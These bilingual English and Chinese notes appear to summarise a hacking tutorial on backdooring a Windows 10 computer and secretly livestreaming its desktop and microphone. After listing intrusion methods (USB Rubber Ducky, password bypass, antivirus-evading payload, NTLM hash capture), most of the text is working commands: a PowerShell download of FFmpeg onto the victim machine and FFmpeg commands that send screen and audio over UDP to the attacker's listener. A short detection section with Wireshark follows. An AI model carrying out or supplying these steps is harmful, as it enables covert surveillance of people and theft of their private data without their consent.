## How to Backdoor Windows 10 & Livestream the Desktop (Without RDP)

### Understanding the FFmpeg Attack [^1]

### Step 1: Backdoor the Target Windows 10 Computer

- [USB Rubber Ducky](https://null-byte.wonderhowto.com/collection/usb-rubber-ducky/)
- Bypass the Login Password  Ref : [StartUp目录](https://null-byte.wonderhowto.com/how-to/hacking-windows-10-break-into-somebodys-computer-without-password-exploiting-system-0183743/#jump-step5) 、[没有密码的情况下进入Windows 10计算机](https://null-byte.wonderhowto.com/how-to/hacking-windows-10-break-into-somebodys-computer-without-password-setting-up-payload-0183584/)
- USB Dead Drop Ref： [USB Dead Drop 攻击WPA2 Wi-Fi密码](https://null-byte.wonderhowto.com/how-to/hack-wpa2-wi-fi-passwords-using-jedi-mind-tricks-usb-dead-drops-0185290/)
- Email Attachment with an Undetectable Payload Ref: [创建无法检测的有效负载](https://null-byte.wonderhowto.com/how-to/hacking-windows-10-create-undetectable-payload-part-1-bypassing-antivirus-software-0185055/)
- Capture & Decrypt the Login Password Ref : [拦截NTLM哈希值](https://en.wikipedia.org/wiki/NTLM#NTLMv2)
- Social Engineering (Other Tactics)
- …

### Step 2: Set Up the UserLAnd App on Android [^2]

- Ref : [将没有root的Android手机变成攻击设备](https://null-byte.wonderhowto.com/how-to/android-for-hackers-turn-android-into-hacking-device-without-root-0189649/)
- [使用Android黑客攻击WPA2 Wi-Fi密码](https://null-byte.wonderhowto.com/how-to/hack-wpa2-wi-fi-passwords-using-android-without-cracking-0192242/)

### Step 3: Install FFmpeg in Kali on Android

`sudo apt-get update && sudo apt-get install ffmpeg`

### Step 4: Start the FFmpeg Listener from Android （192.168.0.208）

`screen ffmpeg -i udp://0.0.0.0:10001 /sdcard/Download/livestream.avi`

[学习使用Screen](https://null-byte.wonderhowto.com/how-to/hacking-windows-10-break-into-somebodys-computer-without-password-setting-up-payload-0183584/#jump-step4)

### Step 5: Install FFmpeg on the Backdoored Windows 10 Computer

`iwr -Uri 'https://ffmpeg.zeranoe.com/builds/win64/static/ffmpeg-20190506-fec4212-win64-static.zip' -Outfile $env:TEMP\ffmpeg.zip`

### Step 6: Unzip the Archive

`Expand-Archive -Path $env:TEMP\ffmpeg.zip -DestinationPath $env:TEMP\ffmpeg\`

`cd "$env:TEMP\ffmpeg\ffmpeg*\bin\"`

### Step 7: Livestream the Windows 10 Desktop

- Video Streaming Only

  `.\ffmpeg.exe -f gdigrab -i desktop -f dshow -f avi udp://192.168.0.208:10001`

- Audio Streaming Only

  `.\ffmpeg.exe -list_devices true -f dshow -i dummy` [^3]

  `.\ffmpeg.exe -f dshow -i audio="Microphone (Realtek High Definition Audio)" -f avi udp://192.168.0.208:10001`

- Video & Audio Streaming Simultaneously

  `.\ffmpeg.exe -f dshow -i audio="Microphone (Realtek High Definition Audio)":video="desktop" -f avi udp://192.168.0.208:10001`

### How to Protect Yourself from FFmpeg Attacks [^4]

- Search for Possibly Malicious Apps
- Use Task Manager to Spot Data-Stealing Apps
- Use Wireshark to Spot Data-Stealing Apps
  - Wireshark抓包
  - Follow UDP Stream
  - Show and save data as **Raw**
  - Save as ”livestream.avi” 文件后即可播放



[原文](https://null-byte.wonderhowto.com/how-to/android-for-hackers-backdoor-windows-10-livestream-desktop-without-rdp-0193190/)

---

[^1]: FFmpeg是一个多媒体框架，能够在Windows，macOS和基于Unix的发行版上加密，流式传输和播放大多数格式的视频。它是一个可移植的独立软件，这意味着它可以作为单个可执行文件运行，无需任何安装或配置
[^2]: UserLAnd是一款Android应用程序，可以在Android操作系统上安装Linux发行版，这不需要获取root权限或擦除Android设备
[^3]: 显示出内置于Windows 10计算机的可用输入接口 （摄像头、麦克风等）
[^4]: 防病毒软件不太可能抵御Windows 10上的这些类型的攻击。毕竟，FFmpeg不被视为恶意应用程序，并且它不会尝试打开端口或修改计算机上的敏感文件